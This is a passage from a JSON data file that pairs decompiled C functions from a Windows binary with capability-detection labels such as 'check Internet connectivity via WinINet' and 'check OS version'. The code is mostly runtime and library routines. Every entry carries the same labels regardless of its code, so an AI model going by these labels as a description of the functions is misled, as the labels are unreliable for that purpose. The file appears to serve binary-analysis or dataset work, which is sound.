        "decompiled_code": "\nuint __cdecl fcn.00035cf0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar1 = fcn.0007855c(arg_8h, &var_10h, &var_8h, 8, 0xe);\n        if (iVar1 != 0) {\n            arg_8h_00 = fcn.000785b6(iVar1);\n            fcn.000354e0(arg_8h_00);\n            arg_ch = 0xffffffff;\n        }\n    }\n    else {\n        fcn.000354e0(0x16);\n        arg_ch = 0xffffffff;\n    }\n    return arg_ch;\n}\n",
        "token_count": 228
    },
    "00035d50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035d50(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035200(0x208);\n    if (var_4h == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.000364b0(var_4h, 0x104, arg_8h);\n        fcn.00078550(&var_ch, var_4h);\n        var_28h = 0x18;\n        var_24h = 0;\n        var_1ch = 0x40;\n        var_20h = &var_ch;\n        var_18h = 0;\n        var_14h = 0;\n        var_10h = fcn.00078568(&var_28h);\n        fcn.00035330(var_4h);\n        if (var_10h == 0) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = fcn.000785b6(var_10h);\n            fcn.000354e0(uVar1);\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 336
    },
    "00035e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035e00(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x208);\n    if (arg_8h_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.000363d0(arg_8h_00, 0x104, arg_8h);\n        uVar1 = fcn.00035d50(arg_8h_00);\n        fcn.00035330(arg_8h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "00035e60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035e60(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    (**0xb1bde100)(&var_10h);\n    uVar1 = fcn.00078784(var_10h + 0x2ac18000, (var_ch + -0x19db1de) - (var_10h < 0xd53e8000), 10000000, 0);\n    if (arg_8h != NULL) {\n        *arg_8h = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "00035eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035eb0(char *arg_8h, char **arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar1 = fcn.000786b2(arg_8h, arg_10h, &var_8h);\n    if (iVar1 != 0) {\n        var_8h = 0;\n    }\n    if (arg_ch != NULL) {\n        for (var_4h = arg_8h;\n            ((('/' < *var_4h && (*var_4h < ':')) || (('`' < *var_4h && (*var_4h < 'g')))) ||\n            (('@' < *var_4h && (*var_4h < 'G')))); var_4h = var_4h + 1) {\n        }\n        *arg_ch = var_4h;\n    }\n    return var_8h;\n}\n",
        "token_count": 221
    },
    "00035f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035f40(uint16_t *arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    uint16_t *var_4h;\n    \n    fcn.00078550(&var_10h, arg_8h);\n    iVar1 = fcn.000786be(&var_10h, arg_10h, &var_8h);\n    if (iVar1 != 0) {\n        var_8h = 0;\n    }\n    if (arg_ch != NULL) {\n        for (var_4h = arg_8h;\n            (((0x2f < *var_4h && (*var_4h < 0x3a)) || ((0x60 < *var_4h && (*var_4h < 0x67)))) ||\n            ((0x40 < *var_4h && (*var_4h < 0x47)))); var_4h = var_4h + 1) {\n        }\n        *arg_ch = var_4h;\n    }\n    return var_8h;\n}\n",
        "token_count": 263
    },
    "00036010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00036010(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint16_t *in_EDX;\n    \n    if (arg_10h != 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h + -1) {\n            iVar1 = fcn.000786ac(in_EDX & 0xffff0000 | *arg_8h);\n            iVar2 = fcn.000786ac(CONCAT22(extraout_var, *arg_ch));\n            if (iVar1 != iVar2) {\n                uVar3 = fcn.000786ac(CONCAT22(extraout_var_00, *arg_8h));\n                uVar4 = fcn.000786ac(uVar3 & 0xffff0000 | *arg_ch);\n                return (uVar3 & 0xffff) - (uVar4 & 0xffff);\n            }\n            if (*arg_8h == 0) {\n                return 0;\n            }\n            arg_8h = arg_8h + 1;\n            in_EDX = arg_ch + 1;\n            arg_ch = in_EDX;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 321
    },
    "000360b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000360b0(uint *arg_8h, ushort *arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_8h;\n    uVar2 = arg_8h[1];\n    uVar5 = fcn.00078796(uVar1, uVar2, 10000000, 0);\n    uVar3 = fcn.00078784(uVar5, 10000, 0);\n    arg_ch[7] = uVar3;\n    uVar5 = fcn.00078784(uVar1, uVar2, 10000000, 0);\n    var_10h = fcn.00078784(uVar5, 0x15180, 0);\n    for (var_14h = fcn.00078796(uVar5, 0x15180, 0); var_14h < 0; var_14h = var_14h + 0x15180) {\n        var_10h = var_10h + -1;\n    }\n    for (; 0x1517f < var_14h; var_14h = var_14h + -0x15180) {\n        var_10h = var_10h + 1;\n    }\n    arg_ch[4] = var_14h / 0xe10;\n    arg_ch[5] = (var_14h % 0xe10) / 0x3c;\n    arg_ch[6] = (var_14h % 0xe10) % 0x3c;\n    arg_ch[2] = var_10h % 7;\n    var_ch = 0x641;\n    while( true ) {\n        iVar4 = fcn.00036290(var_ch);\n        if (var_10h < *(iVar4 * 4 + -0x4e420a88)) break;\n        var_ch = var_ch + 1;\n        var_10h = var_10h - *(iVar4 * 4 + -0x4e420a88);\n    }\n    *arg_ch = var_ch;\n    iVar4 = iVar4 * 0x30 + -0x4e420a80;\n    for (var_18h = 0; *(iVar4 + var_18h * 4) <= var_10h; var_18h = var_18h + 1) {\n        var_10h = var_10h - *(iVar4 + var_18h * 4);\n    }\n    arg_ch[1] = var_18h + 1;\n    arg_ch[3] = var_10h + 1;\n    return;\n}\n",
        "token_count": 692
    },
    "000362e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000362e0(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_34h;\n    uint var_30h;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint var_28h;\n    uint16_t var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    \n    _var_40h = fcn.00078778(*arg_8h, *arg_8h >> 0x1f, 10000000, 0);\n    _var_40h = _var_40h + 0x19db1ded53e8000;\n    var_34h = fcn.0007869a(3, &var_20h, 0x20, 0);\n    if (var_34h == 0) {\n        _var_40h = _var_40h - CONCAT44(var_ch, var_10h);\n    }\n    fcn.000360b0(&var_40h, &var_30h);\n    arg_ch[2] = var_28h;\n    arg_ch[8] = 0;\n    arg_ch[3] = var_2ah;\n    arg_ch[1] = var_28h._2_2_;\n    arg_ch[4] = var_30h._2_2_ - 1;\n    *arg_ch = var_24h;\n    arg_ch[6] = var_2ch;\n    arg_ch[7] = 0;\n    arg_ch[5] = var_30h - 0x76c;\n    return;\n}\n",
        "token_count": 397
    },
    "000363d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000363d0(int16_t *arg_8h, int32_t arg_ch, char *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    if (*arg_10h == '\\\\') {\n        fcn.00037370(arg_10h, arg_8h, arg_ch);\n    }\n    else if ((*arg_10h == '\\0') || (arg_10h[1] != ':')) {\n        fcn.0002bd00(arg_8h, arg_ch);\n        var_8h = arg_8h;\n        do {\n            iVar1 = *var_8h;\n            var_8h = var_8h + 1;\n        } while (iVar1 != 0);\n        iVar2 = var_8h - (arg_8h + 1) >> 1;\n        fcn.00078556(arg_8h + iVar2, arg_ch - iVar2, 0xb1bde644, arg_10h);\n        arg_8h[arg_ch + -1] = 0;\n    }\n    else {\n        fcn.00078556(arg_8h, arg_ch, 0xb1be17d8, arg_10h);\n        arg_8h[arg_ch + -1] = 0;\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "000364b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000364b0(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    if (*arg_10h == 0x5c) {\n        fcn.00078592(arg_8h, arg_10h, arg_ch);\n        arg_8h[arg_ch + -1] = 0;\n    }\n    else if ((*arg_10h == 0) || (arg_10h[1] != 0x3a)) {\n        fcn.0002bd00(arg_8h, arg_ch);\n        var_8h = arg_8h;\n        do {\n            iVar1 = *var_8h;\n            var_8h = var_8h + 1;\n        } while (iVar1 != 0);\n        fcn.000785e6(arg_8h, arg_10h, arg_ch - (var_8h - (arg_8h + 1) >> 1));\n        arg_8h[arg_ch + -1] = 0;\n    }\n    else {\n        iVar2 = fcn.00078556(arg_8h, arg_ch, 0xb1be17e8, arg_10h);\n        if ((iVar2 < 0) || (iVar2 == arg_ch)) {\n            arg_8h[arg_ch + -1] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "000365a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nint32_t __cdecl fcn.000365a0(uint arg_8h, uint arg_ch, uint arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_48h;\n    uint var_40h;\n    char *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035200(0x208);\n    if (var_4h == 0) {\n        iVar2 = 0;\n    }\n    else {\n        for (var_ch = 0; var_ch < 100; var_ch = var_ch + 1) {\n            fcn.00020a20(arg_14h, 0x104, 0xb1be17f8, arg_8h);\n            fcn.000363d0(var_4h, 0x104, arg_14h);\n            fcn.00078550(&var_1ch, var_4h);\n            var_34h = 0x18;\n            var_30h = 0;\n            var_28h = 0x40;\n            var_2ch = &var_1ch;\n            var_24h = 0;\n            var_20h = 0;\n            iVar2 = fcn.0001ec90(&var_8h, 2, &var_34h, &var_14h, 0, 0x100, 0, 2, 0, 0, 0);\n            if (iVar2 == 0) {\n                fcn.00078544(var_8h);\n                break;\n            }\n            arg_8h_00 = fcn.000785b6(iVar2);\n            fcn.000354e0(arg_8h_00);\n        }\n        fcn.00035330(var_4h);\n        var_3ch = arg_14h;\n        do {\n            cVar1 = *var_3ch;\n            var_3ch = var_3ch + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = var_3ch - (arg_14h + 1);\n    }\n    return iVar2;\n}\n",
        "token_count": 591
    },
    "000366f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000366f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint var_2ch;\n    uint var_24h;\n    int16_t *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00035ae0(arg_8h, 0);\n    if (arg_8h_00 == -1) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        puVar3 = fcn.00035200(0x218);\n        if (puVar3 == NULL) {\n            fcn.00035b40(arg_8h_00);\n            fcn.000354e0(0xc);\n            uVar2 = 0xffffffff;\n        }\n        else {\n            *puVar3 = 0;\n            *(puVar3 + 4) = 0;\n            var_4h = fcn.00078658(arg_ch, 0x5c);\n            if (var_4h != 0) {\n                arg_ch = var_4h + 1;\n            }\n            fcn.00037370(arg_ch, puVar3 + 0xc, 0x104);\n            var_20h = puVar3 + 0xc;\n            do {\n                iVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (iVar1 != 0);\n            *(puVar3 + 8) = (var_20h - (puVar3 + 0xe) >> 1) << 1;\n            iVar4 = fcn.0007855c(arg_8h_00, &var_ch, puVar3, *(puVar3 + 8) + 0x10, 10);\n            fcn.00035b40(arg_8h_00);\n            if (iVar4 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.000785b6(iVar4);\n                fcn.000354e0(uVar2);\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 554
    },
    "000368a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000368a0(int32_t arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        return 0;\n    }\n    if (*0xb1c5b3d0 == 0) {\n        iVar1 = (**0xb1bde0dc)(&fcn.000368a0::var_4h, 0, 0, 0, 0, 0xb1c03820, 0xb1c5b3d0);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        var_4h = 0;\n        var_8h = 0;\n        var_ch = 0x368f6;\n        fcn.000785ec();\n        var_ch = var_4h;\n        fcn.00078544();\n        if (*0xb1c5b3d0 == 0) {\n            *arg_ch = 0;\n            return 0;\n        }\n    }\n    if (arg_8h == 0) {\n        var_ch = (**0xb1bde1b8)();\n    }\n    else {\n        iVar1 = (**0xb1bde1d0)(arg_8h, &fcn.000368a0::var_ch);\n        if (iVar1 != 0) {\n            return 0;\n        }\n    }\n    var_8h = var_ch + *0xb1c5b3d0;\n    fcn.00078652(arg_ch, var_8h, arg_10h);\n    arg_ch[arg_10h + -1] = 0;\n    if (arg_8h != 0) {\n        (**0xb1bde2e4)();\n    }\n    return 1;\n}\n",
        "token_count": 437
    },
    "00036980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036980(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c5b3d4 == 0) {\n        iVar1 = (**0xb1bde0dc)(&var_4h, 0, 0, 0, 0, 0xb1c039f0, 0xb1c5b3d4);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.000785ec(var_4h, 0, 0);\n        fcn.00078544(var_4h);\n        if (*0xb1c5b3d4 == 0) {\n            return 0;\n        }\n    }\n    *arg_8h = *0xb1c5b3d4;\n    return 1;\n}\n",
        "token_count": 200
    },
    "00036a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036a80(uint *arg_8h)\n\n{\n    if (arg_8h[3] != 0) {\n        fcn.00035330(arg_8h[3]);\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    return;\n}\n",
        "token_count": 100
    },
    "00036ab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00036ab0(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    (**0xb1bde30c)(arg_8h[3] + 0x28, 0, 0, 0, 0);\n    if ((arg_8h[1] < 1) && (arg_8h[2] != -1)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        *arg_8h = *arg_8h + 1;\n    }\n    else {\n        arg_8h[2] = arg_8h[2] + 1;\n    }\n    (**0xb1bde1a4)(arg_8h[3] + 0x28, 0);\n    if (bVar1) {\n        (**0xb1bde30c)(arg_8h[3], 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "00036b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00036b60(int32_t *arg_8h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 1;\n    (**0xb1bde30c)(arg_8h[3] + 0x28, 0, 0, 0, 0, 0, 1);\n    arg_8h[2] = arg_8h[2] + -1;\n    if (arg_8h[2] == 0) {\n        if (arg_8h[1] < 1) {\n            if (0 < *arg_8h) {\n                arg_8h[2] = *arg_8h;\n                *arg_8h = 0;\n                var_8h = arg_8h[3];\n                var_4h = arg_8h[2];\n            }\n        }\n        else {\n            arg_8h[2] = -1;\n            arg_8h[1] = arg_8h[1] + -1;\n            var_8h = arg_8h[3] + 0x14;\n        }\n    }\n    (**0xb1bde1a4)(arg_8h[3] + 0x28, 0);\n    if (var_8h != 0) {\n        (**0xb1bde1d8)(var_8h, 0, var_4h, 0);\n    }\n    return;\n}\n",
        "token_count": 378
    },
    "00036c40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036c40(int32_t arg_8h)\n\n{\n    bool bVar1;\n    uint var_4h;\n    \n    (**0xb1bde30c)(*(arg_8h + 0xc) + 0x28, 0, 0, 0, 0);\n    bVar1 = *(arg_8h + 8) != 0;\n    if (bVar1) {\n        *(arg_8h + 4) = *(arg_8h + 4) + 1;\n    }\n    else {\n        *(arg_8h + 8) = 0xffffffff;\n    }\n    (**0xb1bde1a4)(*(arg_8h + 0xc) + 0x28, 0);\n    if (bVar1) {\n        (**0xb1bde30c)(*(arg_8h + 0xc) + 0x14, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "00036cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00036cd0(int32_t *arg_8h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 1;\n    (**0xb1bde30c)(arg_8h[3] + 0x28, 0, 0, 0, 0, 0, 1);\n    arg_8h[2] = 0;\n    if (arg_8h[1] < 1) {\n        if (0 < *arg_8h) {\n            arg_8h[2] = *arg_8h;\n            *arg_8h = 0;\n            var_8h = arg_8h[3];\n            var_4h = arg_8h[2];\n        }\n    }\n    else {\n        arg_8h[2] = -1;\n        arg_8h[1] = arg_8h[1] + -1;\n        var_8h = arg_8h[3] + 0x14;\n    }\n    (**0xb1bde1a4)(arg_8h[3] + 0x28, 0);\n    if (var_8h != 0) {\n        (**0xb1bde1d8)(var_8h, 0, var_4h, 0);\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "00036da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00036da0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        var_4h = -0x3fffff11;\n    }\n    else {\n        iVar1 = fcn.00034c90();\n        if (iVar1 == 0) {\n            var_4h = -0x3fffffff;\n        }\n        else {\n            iVar2 = fcn.000786ca(1);\n            iVar3 = fcn.00035200(iVar2 + 0x24);\n            *arg_8h = iVar3;\n            if (*arg_8h == 0) {\n                var_4h = -0x3fffff66;\n            }\n            else {\n                var_4h = fcn.00078694(*arg_8h, 1);\n                if (((var_4h == 0) && (var_4h = fcn.000786d6(*arg_8h, 1, 0, 0),  var_4h == 0)) &&\n                   ((iVar1 == 0x1b || (iVar1 == 0x26)))) {\n                    iVar1 = *arg_8h;\n                    var_4h = fcn.000786d0(iVar1 + 0x14, iVar2 + 0x10, 2);\n                    if (var_4h == 0) {\n                        *(iVar1 + 0x18) = 1;\n                        *(iVar1 + 0x1c) = 0x11;\n                        *(iVar1 + 0x1d) = 0;\n                        *(iVar1 + 0x1e) = 0xc;\n                        *(iVar1 + 0x20) = 0;\n                        var_4h = fcn.000786e2(iVar1 + 0x24, 0xb1c58a38, 1);\n                        if (var_4h == 0) {\n                            puVar4 = fcn.000786c4(iVar1 + 0x24, 0);\n                            *puVar4 = 0x1000;\n                            var_4h = fcn.000786dc(*arg_8h, 1, iVar1 + 0x14, 0);\n                        }\n                    }\n                }\n                if (var_4h != 0) {\n                    fcn.00035330(*arg_8h);\n                    *arg_8h = 0;\n                }\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 623
    },
    "00036f20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036f20(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00035330(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "00036f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00036f80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t var_4h;\n    \n    if (arg_ch == 0) {\n        while( true ) {\n            fcn.000569a0(arg_8h);\n            iVar1 = fcn.0001b770(arg_8h + 4, 0, 0);\n            if (iVar1 == 0) break;\n            fcn.000674e0(arg_8h);\n            for (var_4h = 0; uVar2 = fcn.000785f8(),  var_4h < uVar2 % 10; var_4h = var_4h + 1) {\n            }\n        }\n    }\n    else if (arg_ch == 1) {\n        while (iVar1 = fcn.0001b770(arg_8h + 4, 1, 0),  iVar1 != 0) {\n            for (var_4h = 0; uVar2 = fcn.000785f8(),  var_4h < uVar2 % 10; var_4h = var_4h + 1) {\n            }\n        }\n        do {\n            iVar1 = fcn.0001b770(arg_8h, 0, 0);\n        } while (iVar1 != 0);\n    }\n    else if (arg_ch == 2) {\n        fcn.000569a0(arg_8h + 8);\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "00037060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037060(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch == 0) {\n        fcn.000674e0(arg_8h);\n    }\n    else if (arg_ch == 1) {\n        fcn.000674e0(arg_8h + 4);\n    }\n    else if (arg_ch == 2) {\n        fcn.000674e0(arg_8h + 8);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "000370a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
